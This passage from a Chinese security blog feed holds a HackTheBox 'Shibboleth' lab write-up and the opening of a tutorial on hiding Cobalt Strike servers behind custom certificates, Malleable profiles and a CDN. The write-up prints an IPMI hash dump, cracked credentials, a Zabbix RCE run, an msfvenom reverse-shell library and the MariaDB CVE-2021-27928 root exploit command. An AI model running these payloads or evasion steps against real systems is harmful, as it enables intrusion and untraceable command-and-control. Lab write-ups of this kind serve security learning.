title="一些优化"></a>一些优化</h1><p>使用对GUI支持更好的GVIM。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S gvim</span><br></code></pre></td></tr></table></figure><p>使用clipman处理剪切板</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S clipman</span><br></code></pre></td></tr></table></figure><p>启动后设置同步系统剪切板。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/kingolie/article/details/76723448">Archlinux安装xfce4桌面及美化流程</a></p><p><a href="https://www.offensive-security.com/kali-linux/kali-linux-customization/">Customizing Kali Linux</a></p><p><a href="https://blog.csdn.net/lxyoucan/article/details/115226297">2021年vmware安装archlinux</a></p><p><a href="https://blog.amanshortly.com/arch-linux-installing-xfce-vmware/">Arch Linux: Installing XFCE (VMware)</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>倒腾记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>倒腾记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Shibboleth</title>
    <link href="/2022/04/13/HTB/Shibboleth/"/>
    <url>/2022/04/13/HTB/Shibboleth/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Foothold"><a href="#0x01-Foothold" class="headerlink" title="0x01 Foothold"></a>0x01 Foothold</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -Pn -sC -sV -v <span class="hljs-number">10.10.11.124</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span><br><span class="hljs-string">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="hljs-string">|_http-title: FlexStart Bootstrap Template - Index</span><br></code></pre></td></tr></table></figure><h2 id="shibboleth-htb"><a href="#shibboleth-htb" class="headerlink" title="shibboleth.htb"></a>shibboleth.htb</h2><p>主站是一个静态的前端界面，没啥搞头，然后扫描目录也无果，只能先放弃这个站点。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220406192415320.png" alt="image-20220406192415320"></p><p>尝试爆破一下子域名，发现扫出来三个子域名，指向同一个站点。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -u http:<span class="hljs-regexp">//</span>shibboleth.htb -H <span class="hljs-string">&#x27;Host: FUZZ.shibboleth.htb&#x27;</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404111614875.png" alt="image-20220404111614875"></p><h2 id="zabbix-shibboleth-htb"><a href="#zabbix-shibboleth-htb" class="headerlink" title="zabbix.shibboleth.htb"></a>zabbix.shibboleth.htb</h2><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404133312567.png" alt="image-20220404133312567"></p><p>点击最底下的help可以跳转到如下URL，可以发现是5.0版本的zabbix，考虑google或searchsploit一下对应的exp。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.zabbix.com<span class="hljs-regexp">/documentation/</span><span class="hljs-number">5.0</span>/en<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404133933409.png" alt="image-20220404133933409"></p><p>在尝试了各种zabbix的常见漏洞后，我觉得可能我路子走错了，于是我回到主站点shibboleth.htb，然后拖到最后发现了一个<code>Bare Metal BMC automation</code>是我之前没有注意到的（论信息收集的重要性）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220406194739486.png" alt="image-20220406194739486"></p><p>Google了一下能够发现zabbix的官方网站提到了IPMI，进一步在wikipedia找到了关于IPMI脆弱性的描述。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220406200458500.png" alt="image-20220406200458500"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220406200704860.png" alt="image-20220406200704860"></p><p>Rapid7的这篇文章可以在<a href="https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/">这里</a>找到。</p><p>可以通过nmap对UDP端口进行扫描来验证开启了IPMI服务，注意的是要设置 <code>--min-rate</code>选项和 <code>-F</code> 选项，否则扫描的时间将大大增加。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sU -sV - <span class="hljs-number">10.10.11.124</span> --min-rate <span class="hljs-number">7500</span> -F<br></code></pre></td></tr></table></figure><p>当然Rapid7出品的msf已经集成了这个模块，首先是使用<code>ipmi_version</code>模块查看IPMI模块的版本。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404140914348.png" alt="image-20220404140914348"></p><p>在确认是有漏洞的IPMI2.0后，使用<code>ipmi_dumphashes</code>模块对其进行hashdump。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404141019802.png" alt="image-20220404141019802"></p><p>然后将dump的hash用hashcat进行爆破，能够得到密码是<code>ilovepumkinpie1</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span>.exe -a <span class="hljs-number">0</span> -m <span class="hljs-number">7300</span> hash <span class="hljs-string">&quot;password.txt&quot;</span><br></code></pre></td></tr></table></figure><p>也就是我们现在拿到了一对凭据<code>Administrator:ilovepumkinpie1</code>，拿着它可以登录zabbix。</p><p>登录后看下版本号，为5.0.17，刚好能和一个授权的RCE对上。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404191218891.png" alt="image-20220404191218891"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404191309634.png" alt="image-20220404191309634"></p><p>执行exploit即可拿到zabbix的shell。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> exploit.py http://zabbix.shibboleth.htb/ Administrator ilovepumkinpie1 <span class="hljs-number">10.10.16.10</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(kali㉿kali)-[~<span class="hljs-regexp">/桌面/penelope</span>]<br>└─<span class="hljs-variable">$ </span>./penelope.py -Q<br>zabbix<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span>whoami<br>zabbix<br>zabbix<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>在&#x2F;home目录下有ipmi-svc用户，里面有<code>user.txt</code>。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zabbix<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls<br>ipmi-svc<br></code></pre></td></tr></table></figure><p>但zabbix拿不到，需要切换到<code>ipmi-svc</code>用户。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zabbix<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:/home/ipmi-svc</span><span class="hljs-variable">$ </span>cat user.txt <br><span class="hljs-symbol">cat:</span> <span class="hljs-symbol">user.txt:</span> <span class="hljs-title class_">Permission</span> denied<br></code></pre></td></tr></table></figure><p>切换到<code>ipmi-svc</code>用户后就能拿到user.txt了</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zabbix<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span>su - ipmi-svc<br><span class="hljs-symbol">Password:</span> <br>ipmi-svc<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>whoami<br>ipmi-svc<br>ipmi-svc<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br>ipmi-svc<span class="hljs-variable">@shibboleth</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt<br>d21ead8d************************<br></code></pre></td></tr></table></figure><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>首先看看zabbix关于数据库的配置，根据文档得知在<code>/etc/zabbix/zabbix_server.conf</code>中</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ipmi-svc@shibboleth:~$ cd <span class="hljs-regexp">/etc/</span>zabbix<br>ipmi-svc@shibboleth:<span class="hljs-regexp">/etc/</span>zabbix$ cat zabbix_server.conf | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;^#&quot;</span> | <span class="hljs-keyword">grep</span> .<br>LogFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/zabbix/</span>zabbix_server.log<br>LogFileSize=<span class="hljs-number">0</span><br>PidFile=<span class="hljs-regexp">/run/</span>zabbix/zabbix_server.pid<br>SocketDir=<span class="hljs-regexp">/run/</span>zabbix<br>DBName=zabbix<br>DBUser=zabbix<br>DBPassword=bloooarskybluh<br>SNMPTrapperFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/snmptrap/</span>snmptrap.log<br>Timeout=<span class="hljs-number">4</span><br>AlertScriptsPath=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/zabbix/</span>alertscripts<br>ExternalScripts=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/zabbix/</span>externalscripts<br>FpingLocation=<span class="hljs-regexp">/usr/</span>bin/fping<br>Fping6Location=<span class="hljs-regexp">/usr/</span>bin/fping6<br>LogSlowQueries=<span class="hljs-number">3000</span><br>StatsAllowedIP=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>拿到数据库凭据<code>zabbix:bloooarskybluh</code>。登录之，查看数据库密码。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [zabbix]&gt; select alias,passwd from users;              <br><span class="hljs-code">+---------------+</span>--------------------------------------------------------------+<br><span class="hljs-section">| alias         | passwd                                                       |</span><br><span class="hljs-section">+---------------+--------------------------------------------------------------+</span><br>| Admin         | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |<br>| guest         | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |<br><span class="hljs-section">| Administrator | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |</span><br><span class="hljs-section">+---------------+--------------------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>可惜的是这部分最后似乎没啥用，一番探索后看看MariaDB本身是否存在问题，在searchsploit中找一下相关的exp：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404195651752.png" alt="image-20220404195651752"></p><p>然后看一下MariaDB的版本。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; select version();<br><span class="hljs-code">+----------------------------------+</span><br><span class="hljs-section">| version()                        |</span><br><span class="hljs-section">+----------------------------------+</span><br><span class="hljs-section">| 10.3.25-MariaDB-0ubuntu0.20.04.1 |</span><br><span class="hljs-section">+----------------------------------+</span><br>1 row in set (0.000 sec)<br></code></pre></td></tr></table></figure><p>再去exploitdb看一下版本，可以看到是符合的。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220406213348531.png" alt="image-20220406213348531"></p><p>接着就是按照文件中的指示一步步走，首先生成so文件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.10.16.10</span> LPORT=<span class="hljs-number">8888</span> -f elf-so -o CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">27928</span>.so<br></code></pre></td></tr></table></figure><p>然后在目标机上下载该恶意so文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404201654987.png" alt="image-20220404201654987"></p><p>接着输入执行指令，获得root权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql -u zabbix -p -e <span class="hljs-string">&#x27;SET GLOBAL wsrep_provider=&quot;/tmp/CVE-2021-27928.so&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/Shibboleth.assets/image-20220404202225630.png" alt="image-20220404202225630"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>子域名收集</li><li>历史CVE利用</li><li>hash破解</li><li>配置文件利用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度</title>
    <link href="/2022/04/13/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6/"/>
    <url>/2022/04/13/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文首发于<a href="https://zone.huoxian.cn/d/733-aptcsc2-profilecdn">火线安全社区</a>。</p><p>这年头打个红队都不容易，想普普通通上个线，除了ByPassAV以外，还要应付各种流量审计和设备和威胁情报，一不留神VPS就被扒光了。最近也是一直在倒腾，看了很多文章，但没一个能完全满足要求，或者是按着指示走着走着发现掉坑里了，嗯。本文将通过各种手段一步步将C2的痕迹从网络空间中抹除，并详细记录一下过程，确保人人都能学会。我也按照工作量的大小划分了几个档位，可以按需选取方案。</p><h1 id="0x02-我的环境"><a href="#0x02-我的环境" class="headerlink" title="0x02 我的环境"></a>0x02 我的环境</h1><p>CS 4.3</p><p>centos 7</p><p>nginx&#x2F;1.20.1</p><p>caddy v2.4.6</p><p>国外服务器（如有备案域名也可以使用国内服务器）</p><p>Godaddy购买的域名（<strong>不要使用Freenom的域名！！！</strong>）</p><p>​开始之前，想说明的是基本方案和普通方案都是网上一抓一大把，基本也都能成功。这里只是整合，以及介绍一些坑点。不会过多介绍原理，感谢师傅们的文章。</p><h1 id="0x03-基本方案：更改端口与证书"><a href="#0x03-基本方案：更改端口与证书" class="headerlink" title="0x03 基本方案：更改端口与证书"></a>0x03 基本方案：更改端口与证书</h1><h2 id="更改端口"><a href="#更改端口" class="headerlink" title="更改端口"></a>更改端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim your_cs_path/teamserver<br></code></pre></td></tr></table></figure><p>拉到最后可以看到启动CS的命令，将这个命令的50050改掉，换成自己喜欢的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=2333 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Duser.language=en -javaagent:hook.jar -classpath ./cobaltstrike.jar server.TeamServer $*<br></code></pre></td></tr></table></figure><h2 id="更改证书"><a href="#更改证书" class="headerlink" title="更改证书"></a>更改证书</h2><h3 id="方法一：使用keytool（不推荐）"><a href="#方法一：使用keytool（不推荐）" class="headerlink" title="方法一：使用keytool（不推荐）"></a>方法一：使用keytool（不推荐）</h3><p>修改CS文件夹中的cobaltstrike.store，输入如下命令后输入密码<code>123456</code>即可列出信息：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">keytool -list -v -keystore cobaltstrike.<span class="hljs-keyword">store</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117123922219.png" alt="image-20211117123922219"></p><p>我们可以使用如下命令对该keystore进行修改：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -keystore cobaltstrike.store -storepass <span class="hljs-number">123456</span> -keypass <span class="hljs-number">123456</span> -genkey -keyalg RSA -alias <span class="hljs-number">360</span>.cn -dname <span class="hljs-string">&quot;CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN&quot;</span><br><br><span class="hljs-comment"># 参数说明如下</span><br><span class="hljs-comment"># -keytool -keystore cobaltstrike.store -storepass 密码</span><br><span class="hljs-comment"># -keypass 密码</span><br><span class="hljs-comment"># -genkey -keyalg RSA</span><br><span class="hljs-comment"># -alias google.com -dname CN=(名字与姓氏),</span><br><span class="hljs-comment"># OU=(组织单位名称), O=(组织名称),</span><br><span class="hljs-comment"># L=(城市或区域名称),</span><br><span class="hljs-comment"># ST=(州或省份名称),</span><br><span class="hljs-comment"># C=(单位的两字母国家代码)。</span><br></code></pre></td></tr></table></figure><p>再次查看，能够发现特征已经被去除：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117124808794.png" alt="image-20211117124808794"></p><h3 id="方法二：使用第三方提供的证书生成keystore（推荐）"><a href="#方法二：使用第三方提供的证书生成keystore（推荐）" class="headerlink" title="方法二：使用第三方提供的证书生成keystore（推荐）"></a>方法二：使用第三方提供的证书生成keystore（推荐）</h3><p>这个会在下面的几节中提到。</p><h1 id="0x04-普通方案：使用Profile与CDN"><a href="#0x04-普通方案：使用Profile与CDN" class="headerlink" title="0x04 普通方案：使用Profile与CDN"></a>0x04 普通方案：使用Profile与CDN</h1><h2 id="域名申请（购买）与配置"><a href="#域名申请（购买）与配置" class="headerlink" title="域名申请（购买）与配置"></a>域名申请（购买）与配置</h2><p>​免费的域名可以去<a href="https://www.freenom.com/">Freenom</a> 要一个，也可以去<a href="https://www.godaddy.com/">Godaddy</a>花十多块钱买一个。有了域名后直接接入Cloudflare，需要说明的是freenom的域名有的时候不能被Cloudflare识别，出现如下报错：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/19ec0a187cf1ed37ca8955a2c84ddf581e874f6f_2_690x481.png" alt="Screenshot 2020-08-03 at 11.42.27 AM"></p><p>​遇到这种情况可以多申请几个网站或者过一段时间再试试，反正也不花钱:)。我遇到的情况是同一个免费域名，一开始接入Cloudflare的时候报如上错误，过了三天再尝试接入就成功了。</p><p>​接入后更改NS，按照Cloudflare的指示将域名的NS设置成Cloudflare的即可，这里不再赘述。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161754940.png" alt="image-20211117161754940"></p><p>​接入后配置一个DNS的A记录，解析到VPS的IP，后续上线用。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117161259699.png" alt="image-20211117161259699"></p><h2 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h2><p>​Github上已经有非常多优秀的C2-Profile可以供我们使用了，我们需要使用Profile让Beacon和Teamserver之间的交互看起来尽可能像正常的流量。</p><ul><li><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></li><li><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a></li></ul><p>​这里我使用的是后者jquery的profile。下载下来后需要根据我们的域名对Profile进行修改，以便能够上线HTTP&#x2F;HTTPS BEACON。需要修改的内容主要有四处，一个是https-certificate块中更改keystore和密码，keystore的生成马上讲：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117153504776.png" alt="image-20211117153504776"></p><p>另外三个是http-stager、http-get、http-post块中的Host Header，Referer改不改可以随意。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117153855949.png" alt="image-20211117153855949"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117154138782.png" alt="image-20211117154138782"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117154233410.png" alt="image-20211117154233410"></p><p>​保存修改，然后准备我们的keystore。因为接入了CDN，所以证书我推荐直接使用Cloudflare提供的证书。CDN的坑会在下面讲。当然要是没有接入CDN的打算，可以使用letsencrypt这样的免费证书。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117155627953.png" alt="image-20211117155627953"></p><p>使用默认配置生成证书和秘钥后，复制粘贴到你的服务器上，这里我选择的文件名是server.pem和server.key。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6.assets/image-20211117155702840.png" alt="image-20211117155702840"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这里cdn.xxx.club是我的域名</span><br>openssl pkcs12 -<span class="hljs-built_in">export</span> -<span class="hljs-keyword">in</span> server.pem -inkey server.key -out cdn.xxx.club.p12 -name cdn.xxx.club -passout pass:123456<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 